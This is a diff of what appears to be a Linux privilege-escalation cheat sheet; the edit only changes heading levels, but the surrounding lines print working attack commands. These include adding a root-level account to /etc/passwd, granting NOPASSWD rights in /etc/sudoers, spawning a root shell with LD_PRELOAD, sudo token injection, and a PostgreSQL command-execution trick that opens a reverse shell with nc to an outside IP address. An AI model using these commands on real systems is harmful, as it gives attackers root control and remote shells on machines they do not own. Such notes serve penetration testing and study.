@@ -509,7 +509,7 @@ cat /etc/at.deny
 cat /etc/cron.allow
 cat /etc/cron.deny*
 ```
-###### Insecure file permission /etc/passwd
+##### Insecure file permission /etc/passwd
  ```
  1. check if users have write permission
  2. openssl passwd evil:
@@ -518,12 +518,12 @@ openssl passwd -1 -salt hack password123
  3. echo "root2:$1$eWmYOQrX$UHeqHr4pKVFfx1rrFK05B1:0:0:root:/root:/bin/bash" >> /etc/passwd
  4. su root2, enter passwd as evil
  ```
-###### Writable /etc/sudoers
+##### Writable /etc/sudoers
 ```
 echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
 echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
 ```
-###### LD_PRELOAD and NOPASSWD
+##### LD_PRELOAD and NOPASSWD
 If LD_PRELOAD is explicitly defined in the sudoers file
 ```
 Defaults        env_keep += LD_PRELOAD
@@ -542,7 +542,7 @@ void _init() {
 }
 ```
 Execute any binary with the LD_PRELOAD to spawn a shell : sudo LD_PRELOAD=<full_path_to_so_file> <program>, e.g: sudo LD_PRELOAD=/tmp/shell.so find
-###### Sudo Inject
+##### Sudo Inject
 ```
 $ sudo whatever
 [sudo] password for user:    # Press <ctrl>+c since you don't have the password. # This creates an invalid sudo tokens.
@@ -573,7 +573,7 @@ Requirements
 Ptrace fully enabled (/proc/sys/kernel/yama/ptrace_scope == 0).  
 Current user must have living process that has a valid sudo token with the same uid.  
 >The default password timeout is 15 minutes. So if you use sudo twice in 15 minutes (900 seconds), you will not be asked to type the user’s password again.
-###### Postgresql to RCE
+##### Postgresql to RCE
 ```
 To run system commands on Linux or Windows, we need to use the PROGRAM parameter. We start with creating a table; we can name — shell.
 
@@ -590,12 +590,12 @@ command execution:
 CREATE TABLE shell(output text);
 COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.226 1234 >/tmp/f';
 ```
-###### Check Compressed files
+##### Check Compressed files
 ```
 check zip,gz,7z,stix,rar files
 ```
 
-###### Abusing /etc/sudoers
+##### Abusing /etc/sudoers
 ```
 # Allow members of group sudo to execute any command
 %sudo	ALL=(ALL:ALL) ALL
@@ -603,7 +603,7 @@ check zip,gz,7z,stix,rar files
 # Allow members of group admin to execute any command
 %admin 	ALL=(ALL:ALL) ALL
 ```
-###### Cron using a script with a wildcard (Wildcard Injection)
+##### Cron using a script with a wildcard (Wildcard Injection)
 ```
 [root@RedHat_test ~]# man tar
  -c新建打包文件，同 -v一起使用 查看过程中打包文件名
